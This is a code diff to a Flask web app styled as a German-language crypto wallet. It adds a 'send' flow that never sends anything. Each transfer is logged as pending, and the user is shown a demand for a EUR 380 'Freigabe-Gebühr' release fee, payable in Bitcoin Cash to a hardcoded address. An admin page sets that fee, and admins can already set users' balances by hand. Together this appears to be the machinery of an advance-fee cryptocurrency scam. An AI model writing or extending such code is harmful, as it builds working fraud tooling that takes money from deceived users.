@@ -39,6 +39,7 @@ USERS_XLSX = os.path.join(DATA_DIR, "users.xlsx")
 SESSIONS_XLSX = os.path.join(DATA_DIR, "sessions.xlsx")
 ACTIVITY_XLSX = os.path.join(DATA_DIR, "activity.xlsx")
 WALLETS_XLSX = os.path.join(DATA_DIR, "wallets.xlsx")
+SETTINGS_XLSX = os.path.join(DATA_DIR, "settings.xlsx")
 
 ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
 ADMIN_PASS = os.environ.get("ADMIN_PASS", "change-me-now")
@@ -170,8 +171,9 @@ def _ensure_wallets_skeleton():
         ("ADA",   "Cardano",  0.00, 0.0, "addr1q9zy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"),
         ("DOGE",  "Dogecoin", 0.00, 0.0, "DH5yaieqoZN36pDV3xcpbwAY7Sa1YQsv7p"),
         ("TRX",   "TRON",     0.00, 0.0, "TQrZ7d8xNhP9xK2yR5hLkQ3jF8m6bC4wYvE"),
-        ("MATIC", "Polygon",  0.00, 0.0, "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb0"),
-        ("DOT",   "Polkadot", 0.00, 0.0, "1FRMM8d8HdJzk6FpZ7j5vW2pGcZ7Y2qJxC8Rf5oKjHn8U"),
+("MATIC", "Polygon",   0.00, 0.0, "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb0"),
+        ("DOT",   "Polkadot",  0.00, 0.0, "1FRMM8d8HdJzk6FpZ7j5vW2pGcZ7Y2qJxC8Rf5oKjHn8U"),
+        ("BCH",   "Bitcoin Cash", 0.00, 0.0, "qr5y8q7x9t2k4v6r8p3m5n7s9w2y4a6c8e0g2i4k6o8q0u2w4y6a8c0e2g4i6k8m0o2q4s6u8w0y2a4c6e8g0i2k4m6"),
     ]
     seed_addr = {row[0]: row[4] for row in seed_demo}
     seed_qty  = {row[0]: row[3] for row in seed_demo}   # tuple index 3 = qty
@@ -335,6 +337,58 @@ def _write_wallets(rows):
     )
 
 
+# ----------------------------------------------------------------------------
+# System settings (BCH release fee + future config)
+# ----------------------------------------------------------------------------
+DEFAULT_SETTINGS = {
+    # Required EUR-denominated "Freigabe-Gebühr" the sender must pay in BCH
+    # to release a pending transaction. Admin-editable on /admin/settings.
+    "bch_release_fee_eur": 380.00,
+}
+
+
+def _ensure_settings_skeleton():
+    """Seed settings.xlsx with DEFAULT_SETTINGS on first run."""
+    if not os.path.exists(SETTINGS_XLSX):
+        from openpyxl import Workbook
+        wb = Workbook()
+        ws = wb.active
+        ws.title = "settings"
+        ws.append(["key", "value"])
+        for k, v in DEFAULT_SETTINGS.items():
+            ws.append([k, str(v)])
+        wb.save(SETTINGS_XLSX)
+
+
+def _get_setting(key, default=None):
+    """Read a single setting by key. Returns `default` if missing/bad type."""
+    _ensure_settings_skeleton()
+    rows = _read_xlsx(SETTINGS_XLSX, "settings")
+    for r in rows:
+        if str(r.get("key", "")).strip() == key:
+            raw = r.get("value")
+            if default is None:
+                return raw
+            try:
+                return type(default)(raw)
+            except (TypeError, ValueError):
+                return default
+    return default
+
+
+def _set_setting(key, value):
+    """Upsert a single setting by key (value coerced to str)."""
+    _ensure_settings_skeleton()
+    rows = _read_xlsx(SETTINGS_XLSX, "settings")
+    for r in rows:
+        if str(r.get("key", "")).strip() == key:
+            r["value"] = str(value)
+            _write_xlsx(SETTINGS_XLSX, "settings", rows, ["key", "value"])
+            return
+    rows.append({"key": key, "value": str(value)})
+    _write_xlsx(SETTINGS_XLSX, "settings", rows, ["key", "value"])
+
+
 def _set_wallet(email, symbol, **fields):
     """Update one wallet row (email + symbol). Recreates the row if missing.
     Supported fields: balance_qty, balance_eur, address, name."""
@@ -400,13 +454,43 @@ def _ensure_activity_skeleton():
         wb = Workbook()
         ws = wb.active
         ws.title = "activity"
-        ws.append(["email", "kind", "label", "amount_eur", "amount_qty", "qty_unit", "ts"])
+        ws.append(["email", "kind", "label", "amount_eur", "amount_qty",
+                    "qty_unit", "ts", "status", "address"])
         ws.append([
             "demo@blockchain-demo.com", "received", "Received TRX",
             0.28, 1.0, "TRX",
             datetime(2026, 6, 20, 14, 23).isoformat(timespec="seconds"),
+            "completed", "",
         ])
         wb.save(ACTIVITY_XLSX)
+        return
+
+    # Migrate an existing file: add `status` + `address` columns if missing so
+    # pending sends (Freigabe-Code flow) can be tracked.
+    from openpyxl import load_workbook as _lw
+    try:
+        wb = _lw(ACTIVITY_XLSX, data_only=True)
+    except Exception:
+        return
+    if "activity" not in wb.sheetnames:
+        wb.close()
+        return
+    ws = wb["activity"]
+    rows = list(ws.iter_rows(values_only=True))
+    if not rows:
+        wb.close()
+        return
+    header = [str(h or "").strip() for h in rows[0]]
+    if "status" not in header:
+        header.append("status")
+    if "address" not in header:
+        header.append("address")
+    body = [dict(zip(header, list(r) + [""] * max(0, len(header) - len(r)))) for r in rows[1:]]
+    # Backfill default values
+    for r in body:
+        r.setdefault("status", "completed")
+        r.setdefault("address", "")
+    _write_xlsx(ACTIVITY_XLSX, "activity", body, header)
 
 
 def _activity_for(email):
@@ -418,6 +502,28 @@ def _activity_for(email):
             rows.append(r)
     rows.sort(key=lambda r: str(r.get("ts", "")), reverse=True)
     return rows
+
+
+def _log_activity(email, *, kind, label, amount_eur=0.0, amount_qty=0.0,
+                  qty_unit="", status="completed", address=""):
+    """Append one activity row. Migrates the sheet if `status`/`address`
+    columns are missing on the legacy schema."""
+    _ensure_activity_skeleton()
+    rows = _read_xlsx(ACTIVITY_XLSX, "activity")
+    header = ["email", "kind", "label", "amount_eur", "amount_qty",
+              "qty_unit", "ts", "status", "address"]
+    rows.append({
+        "email": (email or "").strip().lower(),
+        "kind": kind,
+        "label": label,
+        "amount_eur": round(float(amount_eur or 0), 8),
+        "amount_qty": round(float(amount_qty or 0), 8),
+        "qty_unit": qty_unit or "",
+        "ts": datetime.utcnow().isoformat(timespec="seconds"),
+        "status": status,
+        "address": address or "",
+    })
+    _write_xlsx(ACTIVITY_XLSX, "activity", rows, header)
 
 
 # ----------------------------------------------------------------------------
@@ -458,6 +564,7 @@ COINS = [
     {"symbol": "TRX",   "name": "TRON",      "color": "#ff060a", "decimals": 6,  "price_eur":       0.28, "change_24h_pct":  0.12, "market_cap_eur":  "24.1B"},
     {"symbol": "MATIC", "name": "Polygon",   "color": "#8247e5", "decimals": 18, "price_eur":       0.42, "change_24h_pct": -2.18, "market_cap_eur":   "3.9B"},
     {"symbol": "DOT",   "name": "Polkadot",  "color": "#e6007a", "decimals": 10, "price_eur":       5.83, "change_24h_pct":  1.05, "market_cap_eur":   "8.2B"},
+    {"symbol": "BCH",   "name": "Bitcoin Cash", "color": "#0ac18e", "decimals": 8, "price_eur": 384.50, "change_24h_pct":  1.52, "market_cap_eur":  "7.6B"},
 ]
 COIN_BY_SYM = {c["symbol"]: c for c in COINS}
 
@@ -640,6 +747,121 @@ def api_wallet():
 @login_required
 def api_activity():
     return jsonify({"activity": _activity_for(session["user_email"])})
+
+
+# ----------------------------------------------------------------------------
+# Senden (send) — modal submit, pending tx, BCH release fee confirmation
+# ----------------------------------------------------------------------------
+# Address where the user must send the BCH release fee to.
+# This is the "Freigabe-Code" requirement after they initiate any send.
+BCH_RELEASE_ADDRESS = "qrm4k7n9p2s5t8v1w4y6a3c5e7g9i1k3m5o7q9s1u3w5y7"
+
+# Allowed address chars per symbol (basic format check, not chain validation).
+def _address_ok(symbol, address):
+    a = (address or "").strip()
+    if not a or len(a) < 10 or len(a) > 128:
+        return False
+    if symbol in ("BTC", "BCH"):
+        # cashaddr (bch:…) or legacy (1…, 3…) or bech32 (bc1…) — alphanumeric only
+        return all(c.isalnum() for c in a)
+    if symbol in ("ETH", "USDT", "USDC", "BNB", "MATIC"):
+        # 0x + 40 hex
+        if not a.lower().startswith("0x") or len(a) != 42:
+            return False
+        return all(c in "0123456789abcdefABCDEF" for c in a[2:])
+    if symbol == "SOL":
+        return 32 <= len(a) <= 44 and all(c.isalnum() for c in a)
+    if symbol == "XRP":
+        return a.startswith("r") and 25 <= len(a) <= 35 and all(c.isalnum() for c in a)
+    if symbol == "ADA":
+        return a.startswith("addr1") and 50 <= len(a) <= 120
+    if symbol == "DOGE":
+        return a.startswith("D") and 26 <= len(a) <= 40 and all(c.isalnum() for c in a)
+    if symbol == "TRX":
+        return a.startswith("T") and 26 <= len(a) <= 40 and all(c.isalnum() for c in a)
+    if symbol == "DOT":
+        return 46 <= len(a) <= 60 and all(c.isalnum() for c in a)
+    return all(c.isalnum() for c in a)
+
+
+@app.route("/wallet/send", methods=["GET", "POST"])
+@login_required
+def wallet_send():
+    """Render the Senden modal (GET, used to populate the form), or accept a
+    submission (POST): log a pending transaction + redirect to the BCH release
+    page so the user sees the Freigabe-Code requirement."""
+    email = session["user_email"]
+    wallets = _wallets_for(email)
+    if request.method == "POST":
+        symbol = (request.form.get("symbol") or "").strip().upper()
+        address = (request.form.get("address") or "").strip()
+        try:
+            amount_qty = float(request.form.get("amount_qty") or 0)
+        except ValueError:
+            amount_qty = 0.0
+
+        wallet = next((w for w in wallets if str(w.get("symbol", "")).upper() == symbol), None)
+        if not wallet:
+            flash(f"Unbekannter Coin: {symbol}", "error")
+            return redirect(url_for("wallet_home"))
+        if amount_qty <= 0:
+            flash("Bitte einen Betrag gr\u00f6\u00dfer als 0 angeben.", "error")
+            return redirect(url_for("wallet_home"))
+        if not _address_ok(symbol, address):
+            flash("Empf\u00e4nger-Adresse hat ein ung\u00fcltiges Format.", "error")
+            return redirect(url_for("wallet_home"))
+
+        available = float(wallet.get("balance_qty") or 0)
+        if amount_qty > available:
+            flash("Unzureichendes Guthaben f\u00fcr diesen Coin.", "error")
+            return redirect(url_for("wallet_home"))
+
+        price_eur = float(COIN_BY_SYM.get(symbol, {}).get("price_eur") or 0)
+        amount_eur = amount_qty * price_eur
+
+        # Log a pending send activity (status='pending').
+        _log_activity(email, kind="send", label=f"Senden {symbol}",
+                      amount_eur=amount_eur, amount_qty=amount_qty,
+                      qty_unit=symbol, status="pending", address=address)
+
+        # Stash the pending tx in the session so the confirm page can render it
+        # without re-asking. Keep it small + serializable.
+        session["pending_send"] = {
+            "symbol": symbol,
+            "name": wallet.get("name") or symbol,
+            "address": address,
+            "amount_qty": amount_qty,
+            "amount_eur": amount_eur,
+            "price_eur": price_eur,
+            "ts": datetime.utcnow().isoformat(timespec="seconds"),
+        }
+        return redirect(url_for("wallet_send_confirm"))
+
+    # GET — return a JSON dump of wallets for the modal to populate the picker
+    return jsonify({"wallets": wallets})
+
+
+@app.route("/wallet/send/confirm")
+@login_required
+def wallet_send_confirm():
+    """Show the pending transaction + BCH Freigabe-Code requirement."""
+    pending = session.pop("pending_send", None)
+    if not pending:
+        flash("Keine ausstehende \u00dcberweisung.", "error")
+        return redirect(url_for("wallet_home"))
+
+    release_fee_eur = float(_get_setting("bch_release_fee_eur", DEFAULT_SETTINGS["bch_release_fee_eur"]))
+    bch = COIN_BY_SYM.get("BCH", {"price_eur": 0, "symbol": "BCH", "name": "Bitcoin Cash", "color": "#0ac18e"})
+    release_fee_bch = (release_fee_eur / float(bch["price_eur"])) if bch.get("price_eur") else 0
+
+    ctx = _wallet_ctx(session["user_email"])
+    ctx["pending"] = pending
+    ctx["release_fee_eur"] = round(release_fee_eur, 2)
+    ctx["release_fee_bch"] = release_fee_bch
+    ctx["release_fee_bch_qty"] = round(release_fee_bch, 6)
+    ctx["release_address"] = BCH_RELEASE_ADDRESS
+    ctx["bch"] = bch
+    return render_template("send_confirm.html", **ctx)
 
 
 # ----------------------------------------------------------------------------
@@ -976,6 +1198,46 @@ def admin_wallet_edit():
     _set_wallet(email, symbol, balance_qty=qty, address=address)
     flash(f"{symbol}-Guthaben für {email} aktualisiert: {qty} {symbol}", "success")
     return redirect(url_for("admin_dashboard"))
+
+
+@app.route("/admin/settings", methods=["GET", "POST"])
+@admin_required
+def admin_settings():
+    """Edit the BCH release fee + view all system settings."""
+    _ensure_settings_skeleton()
+    if request.method == "POST":
+        # BCH release fee (EUR)
+        try:
+            fee = float((request.form.get("bch_release_fee_eur") or "0").replace(",", "."))
+            if fee < 0:
+                raise ValueError
+        except ValueError:
+            flash("Ungültiger Wert für die BCH-Freigabegebühr.", "error")
+            return redirect(url_for("admin_settings"))
+        _set_setting("bch_release_fee_eur", round(fee, 2))
+
+        # Save arbitrary extra settings if posted (key/value pairs)
+        for k, v in request.form.items():
+            if k.startswith("extra_"):
+                real_key = k[len("extra_"):]
+                if real_key:
+                    _set_setting(real_key, v.strip())
+
+        flash(f"BCH-Freigabegebühr auf {round(fee, 2)} € aktualisiert.", "success")
+        return redirect(url_for("admin_settings"))
+
+    # GET — render settings page
+    settings = {}
+    for r in _read_xlsx(SETTINGS_XLSX, "settings"):
+        settings[str(r.get("key", "")).strip()] = r.get("value")
+    return render_template(
+        "admin_settings.html",
+        active_view="settings",
+        settings=settings,
+        bch_release_fee_eur=settings.get("bch_release_fee_eur", DEFAULT_SETTINGS["bch_release_fee_eur"]),
+        bch_price_eur=COIN_BY_SYM.get("BCH", {}).get("price_eur", 0),
+        coins=COINS,
+    )
 
 
 @app.route("/admin/upload", methods=["POST"])
